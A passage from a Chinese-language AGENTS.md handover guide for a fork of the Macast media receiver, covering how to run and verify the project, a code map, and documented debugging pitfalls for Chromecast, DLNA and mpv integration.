# AGENTS.md — 交接说明（给后续 AI agent / 新协作者）

本文件是**接手这个仓库的第一入口**。它只写"怎么在这里干活、坑在哪、去哪找细节"，
不重复产品说明（见 `README_ZH.md`）和构建说明（见 `BUILDING.md`）。

本仓库是 **`pingod/Macast`**（上游 `xfangfang/Macast` 的分支）。Macast 是一个跨平台
**菜单栏 DLNA / Chromecast / AirPlay 接收端**：手机把媒体 URL 发过来，Macast 用 mpv 播放。

---

## 1. 30 秒跑起来

```shell
cd <repo>
./scripts/run-from-source.sh          # 从源码运行（会 unset PYTHONPATH，见 §5）
```

- 依赖：`.venv`（Python 3.12）+ `requirements/darwin.txt` + `pillow zeroconf pyperclip`。
- Web 设置页：<http://127.0.0.1:58880/>
- 日志：`~/Library/Application Support/Macast/macast.log`（**排障看这个，不是 stdout**）。
  每次启动清空，单文件 2 MB 轮转并保留 2 份备份；设置页「日志」只读末尾若干行（见 §4.10）
- 配置：`~/Library/Application Support/Macast/macast_setting.json`
- 用户插件目录：`.../Macast/renderer/` 与 `.../Macast/protocol/`

## 2. 改完必须做的两件事

```shell
# 1) 静态检查（能秒抓"删代码块时误删变量赋值"这类错误）
env -u PYTHONPATH .venv/bin/python -m pyflakes <改动文件>

# 2) 回归验证（2026-09-25 本机实测 1713/1719 通过，同一份代码在 Linux 容器里 1708/1714；2026-10-01 本机 1761/1767、2026-10-03 本机 1963/1969（v0.23）与 2010/2016（v0.24）与 2012/2018（v0.25）与 2033/2039（v0.26 的卡片文案），
#    同日应用 v0.18.0「网页地址投屏」= 本机 2174/2180（Part 59 的 132 条 + Part 44 新增的 7 条绑定 + Part 11 新增的 2 条粗时钟用例），
#    同一份代码在 Linux 容器里 `--ci` 2173/2179 **通过**（2026-10-03：v0.18.0 首个 tag 在 CI 红了两条，都只在非 macOS 机器上现形，见 §4.2 的「刚写进目录的 .py」与「空结果要说清是哪一种空」），
#    2026-10-04 应用 v0.19.0「投给哪台设备 + 音画合并 + 分享文案 + 登录 cookie」= 本机 2229/2235（Part 59 132→174 条 + Part 36 的 13 条菜单栏用例），
#    同一份代码在 Linux 容器里 `--ci` 2228/2234 **通过**（红集同样是 Part 34 那 6 条）。
#    同日应用 v0.20.0「WebRTC 依赖移出默认产物 + 应用内一键装」= 本机 2305/2311（Part 60 新增 **68** 条：
#    A 6 / B 22 / C 21 / C2 9 / D 10，外加 Part 56/D 那条老用例被**翻面**成"默认产物不再携带"。
#    这里原本抄的是 65 条与「C 18」—— 那是从计划里的算术抄来的，不是跑出来的；本轮按 out.txt 的
#    [PASS]/[FAIL] 行重新数过。一个没被机器问过的数字和"不提问的检查"是同一件事，见 §4.13。
#    C2 那 9 条是真浏览器验收逼出来的：卡片上的答案当时是最后一步的**标签**，
#    「已移除…，原来的文件在 .trash/…」只活在一次性通知里，见 §4.15 的「答案要落在卡片上」）。
#    同一份代码在 Linux 容器里 `--ci` 2304/2310 **通过**（红集同样是 Part 34 那 6 条）。
#    两边总数差 1 是**构成**差不是判据差：Part 19 在这台 Mac 上因为用户的实例占着 8443，
#    只交出 2 条"端口被占就静默降级"，容器里交出 6 条真 TLS；Part 37 有一段按这台机器的
#    声音路由表参数化，容器里少 5 格。正是下一句那句「总数随环境伸缩」。
#    这一轮 Linux 首跑红过一条 Part 56/B —— 那是**套件自己**在计数器刷新之前抓了一瞬间，
#    产品行为没错，见 §4.2 的「第三种形状是"计数器在 flush 之后才加"」。
#    同日应用 v0.21.0「一键装 WebRTC 依赖的三个出厂缺陷」= 本机 2315/2321（Part 60 新增 8 条：
#    C2 的「重启之后」3 条 + C3 的进度与断流 5 条；Part 56/D 新增 2 条转发库用例，那个 Part 现在
#    实测 56 条 = A 7 / B 29 / C 4 / D 16，见 §4.8 v0.22 段末的修正说明）。四个定点变异体各自
#    红 2/1/1/1 条（删掉 `_webrtc_modules()` 里那次挂回 / 从 PyInstaller 命令里删 `--add-binary
#    "$PY3DLL;."` / 把"body 比声明短"那一问判成恒假 / 下载那一步不再交分数），每个跑完整套件、
#    还原后 md5 逐字节一致。
#    同一份代码在 Linux 容器里 `--ci` **2314/2320 通过**（CI GATE: PASSED，红集同样是 Part 34 那 6 条；
#    总数差 1 是本机 8443 被用户的实例占着那一段构成差，见下面「总数随环境伸缩」）。
#    2026-10-05 应用 v0.22.0「设置文件读不懂就整份搬开 + 进度条不倒退」= 本机 **2335/2341**
#    （新增 Part 61 共 18 条：A 段 BOM 与健康读、B 段搬开/后缀环/拒绝的措辞、C 段两份读者同源 + AST；
#    Part 60 现在实测 **78** 条，C3 段 5→7，补的是「跨过猜测之前不许掉」与「钳属于这一次运行」）。
#    七个定点变异体各自红 7/2/4/3/1/1/1 条（`load()` 退回 `utf-8` / 删掉「顶层必须是对象」那一问 /
#    卡住 `rename` / 删掉后缀环 / `save()` 不再显式 encoding / 去掉 `overall()` 的单调钳 /
#    `selfcheck.py` 退回 `utf-8`），每个跑完整套件、还原后 md5 逐字节一致。
#    **诚实的一句**：第一与第三个变异体的红法是**从中间截断**（`check()` 不捕异常，见 §4.14 末条），
#    所以 7 与 4 是下限而不是全集 —— 截断本身也是红，`--ci` 照样拒绝。
#    2026-10-05 应用 v0.24.0「两个站点的解析：一个是我们读错了，另一个是我们说错了」= 本机 **2351/2357**
#    （Part 59 的 A 段 +2 条解转义、I 段 +4 条四句话的判决与词表、Part 44 的 JS 那句现在问**三遍**：
#    帮助、页面、`media_resolve` 的源码里必须有 `JS_HOLE`）。v0.23.0 那两趟（分片 MP4 + 播放器见证，
#    见 §4.14）没有把总数登记在这里 —— 这一行不是漏登，是那两次没在这里写过，别拿它当 v0.23 的数。
#    四个定点变异体各自红 1/4/1/2 条且红集互不相交，逐条名单与"任何 ERROR 都算"那支为什么红 4 条，
#    写在 §4.14 末的「v0.24.0 的两个报错站点」那一段。
#    同一轮再应用 B「浏览器 cookie 的原话分类 + 那一栏读的是引擎的语法」= 本机 **2364/2370**
#    （比上一趟多 13 条，都在 Part 59：R 段的混排 jar、Q 段的四条页面契约、`cookie_source_problem`
#    的逐字词表与可达性、`cookie_browser_spec` 的语法两问 + `名字:资料目录` 逐字节往返 +
#    `::CONTAINER` 两侧各自拒绝。红的仍然是 Part 34 那 6 条。
#    这里的分组是按"这一轮加了哪一问"列的，不是每条的计数 —— 用例站点的净增减（+18/-3 个 `check(`）
#    与 13 这个数对不上，因为有多条按参数循环的用例，也有改写措辞而不改判据的成对增删；
#    **只报跑出来的总数，不报从 diff 里推的分组数**，见 §4.13 那条「一个没被机器问过的数字」）。
#    B 的四个定点变异体各自红 2/3/2/1 条（`engine_note()` 的 `ERROR:` 标记改回「第一行就算」 /
#    删掉 `bad_profile` 那一行并同步缩 `COOKIE_PROBLEMS` / 把 `not_found` 挪到 `locked` 前面 /
#    从 `not_found` 的词表里删掉单数 `'cookie database'`），每个跑完整套件、还原后 md5 逐字节一致。
#    第四个是这一轮学到的形状：**单数 `'cookie database'` 在整个已安装 `yt_dlp` 包里只出现一次，
#    就在 `locked` 自己的那句话里**（`cookies.py:363`），所有 not-found 的raise 都用复数
#    `cookies database` —— 所以那个碎片单独**从不决定任何事**，它的栖息地只在 `locked` 那句之内，
#    而它存在的理由就是让**行序**承重。第一版用例只断言「文字里含有它」+ 结果，所以删掉它 0 红；
#    现在那条用例同时要求**这个碎片必须真的出现在 `not_found` 那一行的词表里**（`any(... in words
#    for problem, words in _COOKIE_SOURCE_TABLE ...)`），删碎片就红，而"行序承重"这句才真的被机器问过。
#    同一轮再应用 D「mpv 投屏窗口的名字」= 本机 **2414/2420**（新增 Part 62 共 **50** 条：
#    A 命名接缝 / B·C 命令行 / D reload / E 播放列表步进 / **E2 `cast_uri` 的行为** 9 条 /
#    F AirPlay PLAY / **F2 发送端 LOAD 命名** 13 条 / G 全仓审计。分组只列**跑出来的**子计数）。
#    六个定点变异体各自红 4/2/5/9/4/5 条，每个跑完整套件、还原后 md5 逐字节一致。
#    **其中两支第一次是 0 红／形状红，这一格必须留在文档里**：第三支（把 `sender_media_title()`
#    换成 `media_resolve.title_for_uri(url)`）在第一版**一条都不红** —— 用例比的是"有没有说话"，
#    不是"说的是谁的名字"；第四支（删掉 `cast_uri` 的命名行、保留那次状态写入）只红在 G 段
#    那个**计数器**上（1 条），也就是说全仓审计在替行为断言干活。补的是两条各自的接缝
#    （F2 问真 LOAD 消息把谁写进播放器、E2 问 `cast_uri` 的命名行真的跑过），
#    补完各自红 5 与 9 条。判据写在 §4.2 的「改播放器的地址，就必须改播放器的名字」。
#    2026-10-06 应用「媒体是不是直播」这一路（§4.1 末三条 + §4.2 末三条）= 产品基线本机全量
#    **2415/2421**（那份跑在 Part 64 之前，`grep -c "Part 64"` 回 0，红的 6 条是 Part 34）。
#    版本：应用 0.24.0 → **0.25.0**（两处），`screen_mirror` 0.29 → **0.30**（这一轮它动了
#    `LAUNCH_ERROR` 那句话的读法，按 §4.15 那条惯例跟一次号；Part 29/39 比的是清单与常量互等，
#    不是字面量，所以升号本身不会红 —— 已用裁剪 harness 外的第二次核对验过两处都是 0.30）。
#    新增 Part 64 共 **234** 条：A 17 / B 14 / C 12 / D 17 / E 31 / F 25 / G 28 / H 30 / I 28 /
#    J 13 / K 11 / L 8（分组按"这个事实住在哪一层"，从发送端自己的字段一路到播放器命令行）。
#    十二个定点变异体各自红 **8/12/4/13/24/7/5/7/11/2/2/1** 条（A…L 与 A…L 段一一对应），
#    且红集只有一种连带：A 与 E 都打掉 `live_from_protocol_info` 的判决，所以红的落在
#    自己的段 + F 段（A: 7+1、B: 6+6、E: 13+8+3），C/D 打掉的是 cast 侧的读法所以连带 G 段
#    （C: 3+1、D: 9+4），F/G/H/I/J/K/L 六支的红**全部**落在自己段内。逐条计数从 /tmp/mut_*.txt
#    的 [FAIL] 行现数，不是抄计划（§4.13）。
#    **这一轮有两支第一次没有牙，都是 `check()` 不捕异常那一族**（§4.14 末的 Part 59 第八支
#    同一个形状）：D 支第一次只交出 52 条结果就 `AttributeError: 'NoneType' object has no
#    attribute 'get'` —— 拒绝消息在变异体手里不再是 dict，而用例直接 `.get()`，于是后半 Part
#    根本没跑；补法是读消息走 `_field64()`，红法变成 13 条且整段跑完。I 支第一次红法是自杀：
#    一个不认直播的播放器交回 3 元的 `loadfile`，用例按 `[4]` 读选项字典 ⇒ `IndexError`
#    吃掉后面 175 条；补法是 `_options64()` / `_first_cmd64()`，并且**长度问句排在索引之前**，
#    而那条"必须是新字典"的用例同时要求 `len == 5` 且逐项等于 `LIVE_LOAD_OPTIONS` ——
#    容错助手没有守卫就会读成真空话（§4.2「不提问的检查」）。另有一支第一次 0 红：
#    L 支（把 `note_media_live` 别名成 `set_media_live`）只红那一条**接缝命名审计**，
#    其余七条问的是 `note_media_live` 自己，别名碰不到它们 —— 这一格留在文档里是因为它
#    说明 L 段的牙只有一颗，而那颗正是这轮唯一防得住"以后有人把消息名写成 `set_media_`"的东西。
#    **诚实的四句**：① Part 64 的 234/234 来自一次性裁剪 harness（套件头部 1–228 行 + Part 64 +
#    SUMMARY 打印），**不是完整套件** —— 用户已裁定不再跑完整测试，所以合并后的全量总数本机
#    没有测过，别把 2415+234 当成读数；**而且那个 harness 必须从仓库文件机械重建**
#    （`head=r[:229]`、`block=r[30791:32765]`、打印段来自旧 harness 尾部，三个边界都带断言）：
#    第一版是手抄的快照，等 B/D/E/H 四段的见证补完后它落后了一轮，于是报出三条**假红**
#    （`B: no-namespace DIDL` 的 XMLSyntaxError、`B: _local_name survives a factory tag`、
#    以及 closer 里 `unsubscribe` 的 `KeyError` —— 那一条直接吃掉 H…L 全部），
#    而产品代码一个字节都没错。重建后 234/234，十二支变异体对着它**重测一遍**，
#    读数与上面那行逐字相同（8/12/4/13/24/7/5/7/11/2/2/1）；② 那个 harness 没有 CI 门也没有 `sys.exit`，
#    所以判据是 `=== SUMMARY: N/M ===` 与 `[FAIL]` 行，**退出码永远是 0**；③ **这一轮裁掉的"跑 Linux"
#    只是我这边不再为它单独起容器**：`push main` 本身就会跑那个 ubuntu `verify --ci` **全量** job，
#    所以 Part 64 在 Linux 上到底认不认账，是推 main 之后读 job 日志问出来的，不是猜的 ——
#    2026-10-06 实测 **2648/2654、`CI GATE: PASSED`**（红的仍是 Part 34 那 6 条，缺历史那一句照旧）。
#    顺带记一条读数习惯：`--log` 里那批「the ledger is computable here / per-file rows are the
#    ledger's own line counts」的清单是**门在解释它豁免了什么**，长得像 21 条新红，不是。
#    （谁哪天把 verify 挪出 main push，这个"免费的一半 Linux 见证"就没了，那时上面那句
#    "干净修法是把 tag 移走重发（见 §6 与 memory 的 CI 读数一条），不是当场改产品代码" 才重新成立。）
#    —— 红的永远是下面那 6 条；**总数随环境伸缩**：场上有一个在跑的 Macast（占着
#    8009/58880，甚至 8443 —— 那会把 Part 19 的 4 条 TLS 用例换成 2 条"端口被占就静默降级"）时真实 socket 的那几段没跑就是没跑，套件不会替它承认。所以先看总数，
#    再信"全绿"；跑之前按 §4.2 杀干净实例。
#    **但这台机器上有一组永远红的**：Part 34（来源台账）的 6 条 —— 见 §4.12 末条，
#    那是这份克隆缺对象，不是台账漂移，**不要去手改 docs/Provenance.md 的数字凑绿**。
#    正因为这 6 条永远红，**CI 跑的是 `--ci`**（见 §6）：它只豁免 Part 34 那 6 条，
#    且豁免的前提（"台账在这里算不出来"）必须自己成立；别的位置变红、或这 6 条在
#    没有完整历史时反而变绿，都会红。发版流程里 `release` 现在等这个 job。）
env -u PYTHONPATH .venv/bin/python scripts/verify_cast_airplay.py
```

> 加新功能/修 bug 时**同时补用例**。这个仓库的验证脚本是唯一能防回退的东西。
> 验证套件把网络全部打桩，所以它**抓不到"真实发送端栈不认账"这类问题**——
> 那类问题要跑 `scripts/cast_conformance.py`（见 §6）。
> 同理它抓不到"应用根本起不来"：套件从不启动 `Macast.py`。跑真应用的是
> `scripts/e2e_smoke.py`（见 §6），它会在本机拉起**第二个** Macast 约 30 秒。

## 3. 代码地图

```
Macast.py                  入口（GUI / CLI 两种模式）
macast/
  macast.py                MacastApp（菜单栏）、MacastPlugin / MacastPluginManager（插件热插拔）
  server.py                CherryPy 服务、HTTP/HTTPS 通道、SSDP 生命周期
  protocol.py              DLNA 协议 + DLNAHandler（Web UI / 管理 API / 网页投屏入口都在这里）、api_token、PlaybackGuard
  protocol_group.py        ProtocolGroup：把多个协议伪装成一个，扇出 start/stop/set_state_*
  protocol_cast.py         Chromecast 接收端（mDNS + Cast v2 over TLS:8009 + setup HTTP:8008）
  protocol_airplay.py      AirPlay 接收端（mDNS + RTSP:7000，仅视频 URL）
  ssdp.py                  SSDP（DLNA 发现）；Sock.send_it 里的 LOCATION 走 Setting.get_ip()
  discovery.py             mDNS 广播（zeroconf），只广播可达地址
  utils.py                 Setting（含网卡枚举/选择）、环境准备、XML 路径
  plugin_repo.py           插件索引/仓库坐标（唯一来源；当前索引为空，第一方插件已全部内置）+ WebRTC extras 资产的**命名与地址**（§4.15）；见 §4.6
  logsplit.py              按模块独立日志文件（logs/<Name>.log）；见 §4.10
  module_settings.py       「模块设置」面板：谁拥有哪个配置键（唯一来源）；见 §4.11
  mirror_view.py           「电脑投屏」tab 的派生层：把 screen_mirror 的 console_state 变成页面要显示的版式（纯函数，无网络无 UI）；见 §4.8
  media_resolve.py          「网页地址投屏」的解析层：抓页面直链 + `yt-dlp -J` 两路合并、去重、ffprobe 度量、判定表与排序（纯 stdlib，无 pip 依赖）；见 §4.14
  media_relay.py            「网页地址投屏」的供流层：`/relay/<随机 id>/media` 本机监听，直链=带请求头反向转发（含 Range 翻译），清单流=ffmpeg `-c copy` 转封装成会增长的临时文件；见 §4.14
  gui.py                   跨平台菜单抽象（darwin: rumps；其他: pystray）
  plugins/renderer/        内置渲染器插件：iina / web / live / potplayer / pi_fm（5 个来自上游合集，vendored）
                              + macast_ytdlp / external_player / floating / hooks / cast_bridge / cast_local_file / screen_mirror（本 fork 自研）
  plugins/protocol/        内置协议插件：nirvana（NVA「哔哩必连」，vendored）+ raop / airplay_mirror（本 fork 自研）
  xml/setting.html         设置页（Vue2 + Element UI，**单文件内嵌模板**；
                           帮助弹层与页宽是对外文案，改能力要同步，见 §4.13）
plugins/                   插件索引目录（仓库根目录，与 macast/plugins/ 区分）；当前仅 info.json（空索引）+ README.md，第一方插件已全部内置；见 §4.6
macast_renderer/mpv.py     MPVRenderer：启动 mpv、走 IPC 收发、把 mpv 事件转成状态
scripts/                  见 §6（`provenance.py` 在里面：按 fork 点度量每一行是谁写的，署名与它对齐；见 §4.12）
docs/                     见 §7
```

## 4. 这个仓库踩过的坑（**最重要的一节**）

这些都是真机/真实网络才暴露的，且每一个都曾经以"看起来像别的问题"的形式出现。
改相关代码前先读对应条目，细节见 `docs/Cast-AirPlay-Testing.md`。

### 4.1 Chromecast 相关

| 症状 | 真因 | 修复要点 |
|---|---|---|
| 能搜到、点投屏没反应 | mDNS 把**所有**本地 IPv4（虚拟机网桥、Tailscale）都发成 A 记录，发送端随机挑到不可达地址 | 只广播承载 IPv4 默认路由的网卡（+ 用户显式选择）；见 `discovery.py` |
| 同上 | `RECEIVER_STATUS` 的 `applications[].namespaces` 必须是**对象数组** `[{"name": ...}]`，字符串数组会被 pychromecast / Cast SDK 拒收 | `_app_namespaces()` |
| VLC 连上后**一个字节都不再发** | device-auth 回复必须是 `DeviceAuthMessage{response: AuthResponse{signature, client_auth_certificate}}`。这两个字段是 `required`，裸发 `AuthResponse` 会让 VLC 的 `ParseFromString()` 失败并 `return`，状态机永远停在 `Authenticating` | `encode_auth_response()` |
| 设备仍被广播、8009 仍 `LISTEN`、TCP 能连，但 TLS 握手永远超时 | **`except OSError: break`**：`ssl.SSLError` 是 `OSError` 子类，某次失败握手把 accept 循环整个干掉了 | 明文监听 + 每连接 `wrap_socket`；循环里区分"监听器没了"与"单条连接失败" |
| 有声音没画面 | 先看 `video-reconfig`（见 §5 排查手法），多数是**发送端只推了音频**（VLC 的 `--sout-chromecast-video` 关掉时 `Add()` 丢弃所有非音频 ES） | `protocol_cast.py` 记录 `contentType` 供判定 |
| 连上了但什么都没播 | mpv 继承了 `http_proxy`，局域网地址也走代理 → `HTTP error 502` | `Setting.get_system_env()` 对播放器摘掉代理变量 |
| **我们自己那台发送端**在镜像时会白等满 10 秒才回落到兼容通道（用户报的「投屏延迟大」里有一大块是它） | `LAUNCH` 收到我们不运行的 appId 时**静默不回话**：发送端的 `launch()` 只能等 `REQUEST_TIMEOUT = 10.0`，而它把这句超时读成"这台设备不支持这个应用"——**非答复也是要付账的答复**（2026-10-05 量） | `SERVED_APP_IDS = (DEFAULT_MEDIA_APP_ID, APP_BACKDROP_ID)`（镜像 app `0F5096E8` 故意不在内）+ `launch_refusal(app_id, request_id)` 立刻在**同一根 socket** 上回 `LAUNCH_ERROR`，带上发送端自己的 `requestId`，`message` 用中文点名"把「投屏方式」改成不带「低延迟」的那一档"（`screen_mirror._CastSender` 现在**先读 `message` 再读 `reason`**，因为真设备只给枚举名，而这句要落到镜像页的「回落原因」上）；`GET_APP_AVAILABILITY` 与 `launch_refusal` 从同一张表派生，`appId` 缺失/空/非字符串一律按默认媒体接收器处理 |
| 直播流被当成本地文件喂给播放器（提前缓冲、进度、拖动全是 VOD 那套；反过来把 VOD 判成直播则拖动直接废掉） | "这是不是一路直播"**坐在发送端自己的字段里**，而不是能从 URL 猜的东西：DLNA 是 `protocolInfo` 的 `DLNA.ORG_OP`（两位都零 ⇒ 不许 Range ⇒ 直播），Cast 是 `LOAD.media.streamType == "LIVE"`。而**我们自己的两种形状都看着像文件**：`screen_mirror` 的"伪装成文件"和网页投屏的 `/relay/<id>/media` —— 按路径猜就会把不受限的时间线交进读前向里 | 三态读数 `True / False / None`（`protocol.live_from_protocol_info()`、`protocol_cast.live_from_stream_type()`），**`None` 不是 `False`**：它意味着"保持今天的行为"，那是任何我们不了解的东西都安全的那一边。这个值随媒体一起走完整条链（见 §4.2 末三条），最后一格落在 mpv 的 `loadfile` 选项字典上 |

### 4.2 通用陷阱

- **`Setting.get(key, default)` 有副作用**：读不存在的 key 会把 default 写进内存 dict 并持久化。
  判断存在性用 `Setting.has()`，删除用 `Setting.unset()`。
- **`setting.html` 在 `Handler.__init__` 里被 `load_xml` 缓存**：改前端模板**必须重启应用**才生效，
  否则会以为"改了没效果"。
- **`ProtocolGroup` + 基类同名空方法**：`Protocol` 自己定义了 `set_state_*` 空方法，
  所以扇出函数必须装到**实例属性**上才能盖过类方法（否则状态静默丢弃）。
- **同一族陷阱第三个成员：`media_is_live`**（2026-10-06）—— `Protocol` 也定义了一个返回 `None`
  的 `media_is_live()` 桩，所以 `ProtocolGroup` 必须把它 `setattr` 到**实例**上（`_LIVENESS_GETTER`
  那一个常量），而 `_install_state_methods()` 清陈旧实例属性时**必须按名字**把它算进清单
  （只筛 `set_state*` / `get_state*` 前缀会漏掉它）。**而且它的委托和 `_delegate_getter` 的
  兜底规则是相反的**：那里 `KeyError` 静默，这里 `False` 是一个**真实答复**必须赢，只有 `None`
  才继续往下问；子协议没意见时答案仍是 `None` 而不是 `''`。见 §4.1 末行的三态读数。
- **同一族陷阱同样吃掉读接口**：`Protocol` 还定义了 `get_state` / `get_state_*` /
  `set_state` 的空实现。`ProtocolGroup` 不覆盖它们，基类的桩就会赢，**永远不转发**给
  真正持有播放状态的 `DLNAProtocol`。症状是"状态页全空"：标题、音量、进度全是空串，
  前端显示 `—` / `0` / `0:00:00` 且永不刷新；字幕显隐开关也一直读到 `''`。
  修法是 `ProtocolGroup._install_state_methods()` 里对 `set_state*` 装扇出、
  对 `get_state*` 装委托（`_delegate_getter`），并且**不要**只按 `set_state_` 前缀筛
  （裸 `set_state` 没有尾随下划线，漏掉它 mpv 的轨道/音量更新就丢了）。
  回归用例在验证套件 Part 6 末尾（`_Rec` 那种不继承 `Protocol` 的假对象抓不到这个 bug，
  必须用真的 `DLNAProtocol`）。
- **`ProtocolGroup.primary` 决定 CherryPy 树根**：它按 `handler_priority` 取最大值。
  某个协议的 handler 若**继承**了另一个协议的 handler（NVA 继承 `DLNAHandler`），
  它必须声明更高的优先级，否则按加入顺序 DLNA 会赢，NVA 的 SETUP/RESTORE 端点
  全部静默不可达。
- **`event_subscribes` 用 `ProtocolGroup.event_subscribes` 聚合**（属性，跨所有子协议合并），
  别再退回 `getattr(protocol, 'event_subscribes', {})`——那只会问到 primary 一个子协议。
- **订阅者必须"没有状态变更也能入表"**：`add_subscribe` 只是把客户端压进
  `append_device_queue`，真正写进 `event_subscribes` 的是**事件线程**。而排空这个队列
  原先只在 `send_states_to_clients()` 里做，那个调用又被 `state_queue` 非空门控。
  DLNA **故意不 observe 播放位置**（位置靠客户端轮询 `GetPositionInfo`），
  所以"视频稳定播放中"时 `state_queue` 一直为空 ⇒ 冷启动后**第一个订阅者永远不进表**，
  设置页「客户端信息」一直显示"暂无订阅客户端"。
  修法：事件线程每轮无条件 `_reap_timed_out_clients()` + `_sync_subscribe_list()`。
  排查现成工具：`curl 'http://127.0.0.1:58880/api?query=subscribers'` —— 按子协议列出
  `subscribed` 与 `pending_append`；**非零 `pending_append` 就是队列没被排空**。
- **`event_subscribes` 是**发布**出去的，不是就地改的（copy-on-write）**：单写者是事件线程，
  它构建新 dict 后**一次赋值**发布；每个读者**把属性绑定一次**再迭代那份快照。
  谁要是往 `self.event_subscribes[...] = ...` / `.pop()` / `.clear()` 这条路回去，
  CherryPy worker 上的读者就会撞 `RuntimeError: dictionary changed size during iteration`。
  两条读路径都用真线程复现过（2026-09-25）：状态页那条合并表读 **8 秒 110 次**（被 try/except
  吃掉 ⇒ 页面「客户端信息」整块消失，症状长得像上一条旧病），`add_subscribe` 那条
  **20 秒 148,302 次**且**没人兜** ⇒ 控制点吃 **HTTP 500**，此后它不再收事件，
  用户读到的是"投屏后进度条不再动"。**这一格是我们的问题不是发送端的**。
  **为什么不是加锁**：`send_states_to_clients` 的迭代横跨对每个订阅者的网络 I/O
  （`HTTPConnection(host, timeout=5)`），一把锁等于让一个死掉的客户端把 SUBSCRIBE 处理按住一个
  connect timeout。同一条路上顺手收掉的两处：`renew_subscribe` 改 `.get()`（sid 在脚下消失时
  回 **412** 而不是抛 `KeyError`），以及 `ObserveClient.__init__` 里那行 `print(self.host)` 删掉
  （每次订阅往没人读的 stdout 写一行；Windows 窗口版根本没有 stdout，见 Part 41）。
  回归用例 **Part 49**（29 条：发布契约 + 五条读路径各自对打一个真在 churn 的写线程 +
  两条"不许再出现就地扩容"的文本规则 + stdout 沉默），四个变异体各自红 8/1/1/1 条。
  细节见 `docs/architecture-review-2026-09.md` 的 R3「已修」。
- **`ProtocolGroup._delegate_getter` 对 `KeyError` 要静默**：状态页会问一批超集键名
  （如 `CurrentURI` 只是 AVTransport.xml 里的 action 参数，不是 stateVariable）。
  按 ERROR 记会变成"每次轮询 × 每个缺失键"各一条，把真问题淹掉。
- **DLNA 默认插件的真实标题是 `DLNA Protocol`**（由类名推导），持久化/比对一律走
  `MacastPluginManager.resolve_title()`，别硬编码 `"DLNA"`。
- **多协议并发时 `event_subscribes` 等 DLNA 专属属性要 `getattr(..., default)`**，
  否则只启用 Chromecast 时会抛 AttributeError。
- **CherryPy 工作线程改 AppKit 菜单不安全**：走 `App.call_on_main_thread()`。
- **菜单项的 `data` 是一个列表下标，所以"藏一行"必须让建造者和点击处理读同一份过滤后的列表**
  （2026-10-04，v0.19 把「电脑投屏」从菜单栏 Renderers 组藏起来）：`App.build_menu_item_group(titles, cb)`
  把 `data=index` 写进**交给它的那个 list**，而 `on_renderer_change_click` 拿这个下标去 `renderer_list[...]`
  取插件。如果建造者读 `renderer_list`、点击读 `menu_renderers()`（或反过来），**用户点到的是下一家渲染器**
  —— 静默地把播放从一个插件搬到另一个，而且没有任何异常。现在两边都走
  `MacastPluginManager.menu_renderers()`。藏身的判据是**类属性** `MENU_HIDDEN`
  （`is_menu_hidden()` / `exported_class()`），**永远不按标题比对**：`resolve_title()` 允许用户改显示名，
  按标题匹配等于让"重命名一个渲染器"能藏掉另一个（这条由变异体 D「把标记挪到基类 `Renderer` 上」钉住：
  挪上去之后所有渲染器都被藏掉，红 1 条）。藏掉不等于停用：持久化的
  `Macast_Renderer = Screen Mirror` 仍然照常起效，`set_media_url` 那条 Bridge 让位也仍然找得到它的
  `mirror_setting()`（那条路本来就是按属性找的）。回归用例在 **Part 36**（41 → 53 条），
  五个变异体各自红在自己的那句话上：建造者忽略过滤 4 条 / 点击按下标读**未过滤**的 `renderer_list` 1 条 /
  打勾循环无条件勾第 0 行 1 条 / 标记挪到基类 1 条 / Screen Mirror 不再声明隐藏 2 条。
- **多实例会把端口写歪**：旧实例占着 58880 时起新实例，端口回退会把 `ApplicationPort`
  改成随机值并重置 USN。起新实例前先杀干净（`lsof -nP -iTCP:8009 -sTCP:LISTEN -t`）。
- **SIGINT 杀得掉菜单栏 Macast，SIGTERM 杀不掉**（2026-09-21 实测，三次跑里三次一致）。
  Cocoa 事件循环不理会 `SIGTERM`，`kill <pid>` 之后进程照常监听 58880/8009。所以 §4.2 上面那条
  "起新实例前先杀干净"**必须是 `kill -2`**（或走菜单），`scripts/e2e_smoke.py` 的信号升级顺序
  也因此是 SIGINT → SIGTERM → SIGKILL 而不是 SIGTERM 优先。附带一条更烦的：**信号退出跳过
  `MPVRenderer.stop()` 的收尾**，空闲的 mpv 会留在场上（三次跑里两次如此，本机另有 5 个
  `ppid=1`、活了 1–3 天的 mpv 佐证）——被反复重启的 Macast 会**攒播放器**。清理用
  `lsof -nP -iTCP:<port> -sTCP:LISTEN -t` + `pgrep -f <ipc socket path>`，`ps` 在这台机器的
  CLI 沙箱里不可用（见 §5）。
- **`mpv --http-proxy=` 不能替代摘环境变量**，ffmpeg 的 HTTP 层仍然读 `http_proxy`。
- **HTTP 客户端库"默认不读环境变量"这个前提，本身也要被问一遍**（2026-10-13，Rust 侧移植
  `media_relay` 时实测）。`ureq` 的 `get()`/`Agent::from_defaults()` 会读**系统代理设置**，所以
  中转去取源站时请求根本没到源站：症状是 `io: Peer disconnected` —— 一句读起来像"这个模块连不
  上任何源站"的话，而真实原因只是这台机器的 Wi-Fi 代理（`127.0.0.1:9565`）在中间。这与上一条
  mpv 的 `502` 是**同一个坑的两端**：一个是"显式清了还不够"，一个是"以为没继承其实继承了"。
  修法是显式建一次 agent：`.proxy(None)` + 固定的 User-Agent + 超时，而不是每次调用现取。**判据**
  放在真正走网络的那条用例上（"设备的 Range 被翻译给了源站"），因为只有它能把代理这件事变成
  红；纯决策函数的用例问不到代理，也就问不到这个默认值。
- **假命令行工具的输出，必须是真工具在这台机器上的逐字输出**。`screen_mirror` 的采集探测要问
  `ffmpeg -f avfoundation -list_devices true -i ""` 有哪些设备，而那段解析是按一个**从未存在过的
  格式**写的：它找大写 `Video devices:` 且只取双引号里的名字，真实输出是小写
  `AVFoundation video devices:` 且设备名**不带引号**（`[0] OBS Virtual Camera`）。结果真 Mac 上
  两个列表永远为空、镜像从 v0.1 起就起不来 —— 而验证套件全绿，**因为 Part 21/22/23 的假 ffmpeg
  抄的就是那个虚构格式**：测试和实现共享同一个错误假设时，用例数为零。现在 Part 31 用真机输出喂解析器，
  并反过来扫测试文件自己：`-list_devices` 回答里出现"带引号却没有索引"的设备行就变红。
- **桩自己也会撒谎，而"读法宽容"会把谎藏起来**（2026-10-13，Rust 中转的假 origin）。第一版桩把响应头
  写成了 `...Content-Length: 1\r\n` 就直接接正文，**漏掉头部块末尾的空行**。裸 socket 的
  `read_to_end` 读到 EOF 所以完全满意，于是单跑那条用例是绿的；ureq 是真解析器，它等的是那个空行，
  等不到就报 `Peer disconnected`。**同一个桩因此给出两个相反的结论**，而"用哪种客户端读它"
